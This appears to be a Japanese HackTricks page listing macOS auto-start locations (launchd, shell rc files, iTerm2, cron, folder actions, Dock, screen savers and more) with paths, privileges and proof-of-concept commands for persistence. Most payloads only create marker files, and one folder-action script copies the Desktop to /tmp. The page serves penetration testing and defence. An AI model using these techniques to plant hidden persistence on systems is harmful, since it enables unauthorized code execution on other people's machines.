# macOSの自動起動場所

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

このセクションは、ブログシリーズ[**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/)を基にしており、目標は、**より多くの自動起動場所**（可能な場合）を追加し、最新バージョンのmacOS（13.4）で**どのテクニックがまだ機能しているか**を示し、必要な**権限**を指定することです。

### Launchd

#### 場所

* **`/Library/LaunchAgents`**
* **トリガー**: 再起動
* ルート権限が必要です
* **`/Library/LaunchDaemons`**
* **トリガー**: 再起動
* ルート権限が必要です
* **`/System/Library/LaunchAgents`**
* **トリガー**: 再起動
* ルート権限が必要です
* **`/System/Library/LaunchDaemons`**
* **トリガー**: 再起動
* ルート権限が必要です
* **`~/Library/LaunchAgents`**
* **トリガー**: 再ログイン
* **`~/Library/LaunchDemons`**
* **トリガー**: 再ログイン

#### 説明とペイロード

**`launchd`**は、OX Sカーネルが起動時に実行する**最初のプロセス**であり、シャットダウン時に終了する最後のプロセスです。常に**PID 1**を持つべきです。このプロセスは、以下の場所にある**ASEP** **plist**で指定された設定を**読み取り、実行**します。

* `/Library/LaunchAgents`: 管理者によってインストールされたユーザーごとのエージェント
* `/Library/LaunchDaemons`: 管理者によってインストールされたシステム全体のデーモン
* `/System/Library/LaunchAgents`: Appleが提供するユーザーごとのエージェント。
* `/System/Library/LaunchDaemons`: Appleが提供するシステム全体のデーモン。

ユーザーがログインすると、`/Users/$USER/Library/LaunchAgents`と`/Users/$USER/Library/LaunchDemons`にあるplistが**ログインしたユーザーの権限**で開始されます。

**エージェントとデーモンの主な違いは、エージェントはユーザーがログインすると読み込まれ、デーモンはシステムの起動時に読み込まれる**ことです（sshなどのサービスは、ユーザーがシステムにアクセスする前に実行する必要があるため）。また、エージェントはGUIを使用する場合があり、デーモンはバックグラウンドで実行する必要があります。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
ユーザーがログインする前に**エージェントを実行する必要がある**場合があります。これらは**PreLoginAgents**と呼ばれます。たとえば、これはログイン時に支援技術を提供するために役立ちます。これらは`/Library/LaunchAgents`にも見つけることができます（[**こちら**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents)に例があります）。

{% hint style="info" %}
新しいデーモンまたはエージェントの設定ファイルは、**次回の再起動後または** `launchctl load <target.plist>`を使用して**ロードされます**。また、拡張子なしの.plistファイルを`launchctl -F <file>`でロードすることも可能です（ただし、これらのplistファイルは自動的に再起動後にロードされません）。
`launchctl unload <target.plist>`を使用して**アンロード**することも可能です（それによって指定されたプロセスは終了します）。

エージェントまたはデーモンが**実行されるのを妨げる**（オーバーライドなど）**何もないことを確認する**には、次のコマンドを実行します：`sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
{% endhint %}

現在のユーザーによってロードされているすべてのエージェントとデーモンをリストアップします：
```bash
launchctl list
```
### シェルの起動ファイル

解説: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
解説 (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

#### 場所

* **`~/.zshrc`, `~/.zlogin`, `~/.zshenv`, `~/.zprofile`**
* **トリガー**: zshでターミナルを開く
* **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
* **トリガー**: zshでターミナルを開く
* ルート権限が必要
* **`~/.zlogout`**
* **トリガー**: zshでターミナルを終了する
* **`/etc/zlogout`**
* **トリガー**: zshでターミナルを終了する
* ルート権限が必要
* 他にもあるかもしれない: **`man zsh`**
* **`~/.bashrc`**
* **トリガー**: bashでターミナルを開く
* `/etc/profile` (動作しなかった)
* `~/.profile` (動作しなかった)
* `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
* **トリガー**: xtermで起動することが期待されていますが、**インストールされていない**ため、インストールしてもこのエラーが表示されます: xterm: `DISPLAY is not set`

#### 説明

シェルの起動ファイルは、`zsh`や`bash`などのシェル環境が**起動する**ときに実行されます。macOSでは、最近はデフォルトで`/bin/zsh`が使用され、**`Terminal`を開いたり、デバイスにSSH接続したり**すると、このシェル環境に配置されます。`bash`や`sh`も利用可能ですが、明示的に起動する必要があります。

`man zsh`で読むことができるzshのマニュアルページには、起動ファイルの詳しい説明があります。
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)

#### 場所

* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
* **トリガー**: iTermを開く
* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
* **トリガー**: iTermを開く
* **`~/Library/Preferences/com.googlecode.iterm2.plist`**
* **トリガー**: iTermを開く

#### 説明

**`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**に保存されたスクリプトが実行されます。例えば:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
スクリプト **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** も実行されます:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
**`~/Library/Preferences/com.googlecode.iterm2.plist`**にあるiTerm2の設定は、iTerm2ターミナルが開かれたときに実行するコマンドを示すことができます。

この設定はiTerm2の設定で構成することができます：

<figure><img src="../.gitbook/assets/image.png" alt="" width="563"><figcaption></figcaption></figure>

そして、コマンドは設定に反映されます：
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
コマンドを実行するには、次のように設定できます：

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
{% endcode %}

{% hint style="warning" %}
iTerm2の設定を悪用する他の方法がある可能性が非常に高いです。
{% endhint %}

### 再オープンされるアプリケーション

**解説**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)

#### 場所

* **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
* **トリガー**: アプリケーションの再起動

#### 説明とエクスプロイト

再オープンされるすべてのアプリケーションは、plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` 内にあります。

したがって、自分のアプリケーションを再オープンアプリケーションとして起動させるには、**アプリケーションをリストに追加するだけ**です。

UUIDは、そのディレクトリをリストアップするか、`ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` を使用して見つけることができます。

再オープンされるアプリケーションを確認するには、次のコマンドを実行します:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
このリストにアプリケーションを追加するには、次の方法を使用できます：
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
{% hint style="danger" %}
前のセクションを追加しても、ログアウトしてログインしたり、再起動してもアプリが実行されませんでした。（アプリが実行されていないかもしれません。これらのアクションが実行されるときに実行される必要があるかもしれません）
{% endhint %}

### Cron

**解説**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)

#### 位置

* **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
* 直接書き込みアクセスにはルート権限が必要です。`crontab <file>`を実行できる場合はルート権限は必要ありません。
* **トリガー**: cronジョブに依存します。

#### 説明とエクスプロイト

現在のユーザーのcronジョブをリストアップします。
```bash
crontab -l
```
ユーザーのすべてのcronジョブは、**`/usr/lib/cron/tabs/`**と**`/var/at/tabs/`**（root権限が必要）にあります。

MacOSでは、**特定の頻度**でスクリプトを実行するいくつかのフォルダが次の場所にあります：
```bash
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
そこには通常の**cronジョブ**、あまり使われていない**atジョブ**、および一時ファイルのクリーニングに主に使用される**periodicジョブ**があります。例えば、デイリーのperiodicジョブは次のように実行できます: `periodic daily`。

**ユーザーのcronジョブをプログラムで追加**するには、次のようにすることができます:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### 定期的な

解説: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)

#### 場所

* `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
* ルート権限が必要
* **トリガー**: 指定した時間になったとき
* `/etc/daily.local`, `/etc/weekly.local` または `/etc/monthly.local`
* ルート権限が必要
* **トリガー**: 指定した時間になったとき

#### 説明と攻撃手法

定期的なスクリプト (**`/etc/periodic`**) は、`/System/Library/LaunchDaemons/com.apple.periodic*` で設定された **ランチデーモン** のために実行されます。`/etc/periodic/` に保存されたスクリプトは、ファイルの所有者として **実行** されるため、潜在的な特権エスカレーションには使用できません。

{% code overflow="wrap" %}
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
{% endcode %}

他にも、実行される定期的なスクリプトがあります。これは **`/etc/defaults/periodic.conf`** に示されています。
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.github.io/beyond/beyond\_0005/)

#### 場所

* 常にルート権限が必要です

#### 説明

PAMはmacOS内での簡単な実行よりも**持続性**とマルウェアに焦点を当てているため、このブログでは詳細な説明は行いません。このテクニックをよりよく理解するために、上記の記事を読んでください。

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)

#### 場所

* **`~/.ssh/rc`**
* **トリガー**: SSH経由でログインする際
* **`/etc/ssh/sshrc`**
* ルート権限が必要です
* **トリガー**: SSH経由でログインする際

#### 説明

デフォルトでは、`/etc/ssh/sshd_config`で`PermitUserRC no`が指定されていない限り、ユーザーが**SSH経由でログイン**すると、スクリプト**`/etc/ssh/sshrc`**と**`~/.ssh/rc`**が実行されます。

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)

#### 場所

* **`~/Library/Application\ Support/xbar/plugins/`**
* **トリガー**: xbarが実行されるとき

#### 説明

人気のあるプログラム[**xbar**](https://github.com/matryer/xbar)がインストールされている場合、**`~/Library/Application\ Support/xbar/plugins/`**にシェルスクリプトを書くことができます。このスクリプトはxbarが起動されると実行されます。
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**解説**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)

#### 場所

* **`~/.hammerspoon/init.lua`**
* **トリガー**: Hammerspoonが実行されるとき

#### 説明

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon)は、**LUAスクリプト言語を通じてmacOSのスクリプト化を可能にする**自動化ツールです。AppleScriptのコードを埋め込むこともでき、シェルスクリプトを実行することもできます。

このアプリは、単一のファイルである`~/.hammerspoon/init.lua`を探し、起動時にスクリプトが実行されます。
```bash
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("id > /tmp/hs.txt")
EOF
```
### Preference Pane

Writeup: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)

#### 場所

* **`/System/Library/PreferencePanes`**
* **`/Library/PreferencePanes`**
* **`~/Library/PreferencePanes`**

#### 説明

これはもう動作していないようです。

### Spotlight Importers

Writeup: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)

#### 場所

* **`/Library/Spotlight`**&#x20;
* **`~/Library/Spotlight`**

#### 説明

これは**重いサンドボックス**になるため、おそらくこのテクニックを使用したくないでしょう。

### オーディオプラグイン

Writeup: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

#### 場所

* **`/Library/Audio/Plug-Ins/HAL`**
* ルートアクセスが必要
* **トリガー**: coreaudiodまたはコンピュータの再起動
* **`/Library/Audio/Plug-ins/Components`**
* ルートアクセスが必要
* **トリガー**: coreaudiodまたはコンピュータの再起動
* **`~/Library/Audio/Plug-ins/Components`**
* **トリガー**: coreaudiodまたはコンピュータの再起動
* **`/System/Library/Components`**
* ルートアクセスが必要
* **トリガー**: coreaudiodまたはコンピュータの再起動

#### 説明

以前の記事によると、いくつかのオーディオプラグインを**コンパイル**してロードすることが可能です。

### フォルダアクション

Writeup: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

#### 場所

* `/Library/Scripts/Folder Action Scripts`
* ルートアクセスが必要
* `~/Library/Scripts/Folder Action Scripts`

#### 説明と攻撃手法

フォルダアクションスクリプトは、アタッチされているフォルダにアイテムが追加または削除された場合、またはそのウィンドウが開かれたり閉じられたり移動したりサイズが変更されたりすると実行されます。

* Finder UIを介してフォルダを開く
* フォルダにファイルを追加する（ドラッグ＆ドロップまたはターミナルからのシェルプロンプトから行うこともできます）
* フォルダからファイルを削除する（ドラッグ＆ドロップまたはターミナルからのシェルプロンプトから行うこともできます）
* UIを介してフォルダからナビゲートする

これを実装する方法はいくつかあります：

1. [Automator](https://support.apple.com/guide/automator/welcome/mac)プログラムを使用して、フォルダアクションワークフローファイル（.workflow）を作成し、サービスとしてインストールします。
2. フォルダを右クリックし、「フォルダアクションの設定...」を選択し、「サービスを実行」を選択し、スクリプトを手動でアタッチします。
3. OSAScriptを使用して、Apple Eventメッセージを`System Events.app`に送信して新しい`フォルダアクション`をプログラムでクエリおよび登録します。

* これは、OSAScriptを使用してApple Eventメッセージを`System Events.app`に送信して永続性を実装する方法です。

実行されるスクリプトは次のとおりです：

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

次のスクリプトを実行して、フォルダアクションを有効にし、以前にコンパイルされたスクリプトを`/users/username/Desktop`フォルダにアタッチします。

```applescript
tell application "Finder"
    set folderPath to POSIX file "/users/username/Desktop" as alias
    set scriptPath to POSIX file "/path/to/folder.scpt" as alias
    set folderActionsEnabled to folder actions enabled
    if not folderActionsEnabled then
        set folder actions enabled to true
    end if
    try
        set currentScripts to scripts folder of folderPath
        set scriptName to name of scriptPath
        set scriptExists to false
        repeat with currentScript in currentScripts
            if name of currentScript is scriptName then
                set scriptExists to true
                exit repeat
            end if
        end repeat
        if not scriptExists then
            move scriptPath to currentScripts
        end if
    end try
end tell
```

このスクリプトは、指定したフォルダにフォルダアクションを有効にし、以前にコンパイルされたスクリプトをアタッチします。フォルダアクションは、指定したフォルダ内のファイルやフォルダに対して自動的に実行されるスクリプトです。このスクリプトを実行することで、指定したフォルダ内のファイルやフォルダに対して自動的にスクリプトが実行されるようになります。
```javascript
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
```
スクリプトを実行するには、次のコマンドを使用します：`osascript -l JavaScript /Users/carlospolop/attach.scpt`



* これはGUIを介してこの永続性を実装する方法です：

実行されるスクリプトは次のとおりです：

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

次のコマンドでコンパイルします: `osacompile -l JavaScript -o folder.scpt source.js`

次の場所に移動します:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
次に、「Folder Actions Setup」アプリを開き、**監視したいフォルダ**を選択し、この場合は**`folder.scpt`**（私の場合はoutput2.scpと呼んでいます）を選択します：

<figure><img src="../.gitbook/assets/image (2).png" alt="" width="297"><figcaption></figcaption></figure>

これで、**Finder**でそのフォルダを開くと、スクリプトが実行されます。

この設定は、**base64形式で保存された**`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`というplistファイルに保存されています。

次に、GUIアクセスなしでこの永続化を準備してみましょう：

1. **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**をバックアップするために`/tmp`にコピーします：
* `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. さきほど設定したフォルダアクションを**削除**します：

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

これで、空の環境ができました。

3. バックアップファイルをコピーします：`cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. この設定を適用するために、Folder Actions Setup.appを開きます：`open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

{% hint style="danger" %}
私の場合はうまくいきませんでしたが、これがwriteupの指示です:(
{% endhint %}

### Dockショートカット

Writeup: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)

#### 位置

* `~/Library/Preferences/com.apple.dock.plist`
* **トリガー**: ユーザーがドック内のアプリをクリックしたとき

#### 説明と攻撃手法

ドックに表示されるすべてのアプリケーションは、plistファイル**`~/Library/Preferences/com.apple.dock.plist`**に指定されています。

アプリケーションを追加するには、次のようにします：

{% code overflow="wrap" %}
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
{% endcode %}

### emond

Writeup: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

このコンポーネントは私のmacOSには見つかりませんので、詳細についてはwriteupを確認してください。

### QuickLookプラグイン

Writeup: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)

#### 位置

* `/System/Library/QuickLook`
* `/Library/QuickLook`
* `~/Library/QuickLook`
* `/Applications/AppNameHere/Contents/Library/QuickLook/`
* `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### 説明と攻撃手法

QuickLookプラグインは、**ファイルのプレビューをトリガー**（Finderでファイルを選択してスペースバーを押す）し、**そのファイルタイプをサポートするプラグイン**がインストールされている場合に実行されることがあります。

自分自身のQuickLookプラグインをコンパイルし、前述のいずれかの場所に配置してロードし、サポートされているファイルに移動してスペースを押すことでトリガーすることが可能です。

### Authorizationプラグイン

Writeup: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

#### 位置

* `/Library/Security/SecurityAgentPlugins/`
* ルート権限が必要です
* また、必要です

#### 説明と攻撃手法

Todo

### Color Pickers

Writeup: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)

#### 位置

* `/Library/ColorPickers`&#x20;
* ルート権限が必要です
* トリガー：カラーピッカーを使用する
* `~/Library/ColorPickers`
* トリガー：カラーピッカーを使用する

#### 説明と攻撃手法

自分のコードでカラーピッカーのバンドルをコンパイルします（たとえば、[**このコード**](https://github.com/viktorstrate/color-picker-plus)を使用できます）。そして、コンストラクタを追加します（[スクリーンセーバーのセクション](macos-auto-start-locations.md#screen-saver)のように）そして、バンドルを`~/Library/ColorPickers`にコピーします。

その後、カラーピッカーがトリガーされると、あなたのコードも実行されるはずです。

注意：あなたのライブラリをロードするバイナリには、**非常に制限の厳しいサンドボックス**があります：`/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

{% code overflow="wrap" %}
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
{% endcode %}

### XQuartz

Writeup: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

#### 場所

* **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
* ルート権限が必要
* **トリガー**: XQuartzを使用する場合

#### 説明とエクスプロイト

XQuartzは**もはやmacOSにインストールされていません**ので、詳細はライトアップを確認してください。

### kext

KEXTを起動アイテムとしてインストールするには、次の場所のいずれかに**インストールする必要があります**：

* `/System/Library/Extensions`
* OS Xオペレーティングシステムに組み込まれたKEXTファイル。
* `/Library/Extensions`
* サードパーティのソフトウェアによってインストールされたKEXTファイル

現在ロードされているkextファイルをリストアップするには、次のコマンドを使用します：
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
詳細については、[**カーネル拡張に関するこのセクション**](macos-security-and-privilege-escalation/mac-os-architecture#i-o-kit-drivers)を参照してください。

### amstoold

解説: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)

#### 場所

* **`/usr/local/bin/amstoold`**
* ルート権限が必要です

#### 説明と攻撃手法

おそらく、`/System/Library/LaunchAgents/com.apple.amstoold.plist`の`plist`がこのバイナリを使用していたが、バイナリが存在しなかったため、そこに何かを配置することができ、XPCサービスが呼び出されるときにバイナリが呼び出されます。

私のmacOSではこれを見つけることができません。

### xsanctl

解説: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.github.io/beyond/beyond\_0015/)

#### 場所

* **`/Library/Preferences/Xsan/.xsanrc`**
* ルート権限が必要です
* **トリガー**: サービスが実行されるとき（まれに）

#### 説明と攻撃手法

このスクリプトを実行することはあまり一般的ではないようで、私のmacOSでも見つけることができませんでしたので、詳細については解説を参照してください。

### スクリーンセーバー

解説: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
解説: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

#### 場所

* `/System/Library/Screen Savers`&#x20;
* ルート権限が必要です
* **トリガー**: スクリーンセーバーを選択するとき
* `/Library/Screen Savers`
* ルート権限が必要です
* **トリガー**: スクリーンセーバーを選択するとき
* `~/Library/Screen Savers`
* **トリガー**: スクリーンセーバーを選択するとき

<figure><img src="../.gitbook/assets/image (1).png" alt="" width="375"><figcaption></figcaption></figure>

#### 説明と攻撃手法

Xcodeで新しいプロジェクトを作成し、新しい**スクリーンセーバー**を生成するためのテンプレートを選択します。次に、コードを追加します。たとえば、以下のコードを使用してログを生成します。

**ビルド**し、`.saver`バンドルを**`~/Library/Screen Savers`**にコピーします。その後、スクリーンセーバーGUIを開き、それをクリックするだけで、多くのログが生成されるはずです。

{% code overflow="wrap" %}
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
{% endcode %}

{% hint style="danger" %}
このコードを読み込むバイナリ(`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`)の権限情報には、**`com.apple.security.app-sandbox`**が含まれているため、**一般的なアプリケーションのサンドボックス内**にいることに注意してください。
{% endhint %}

セーバーコード：
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
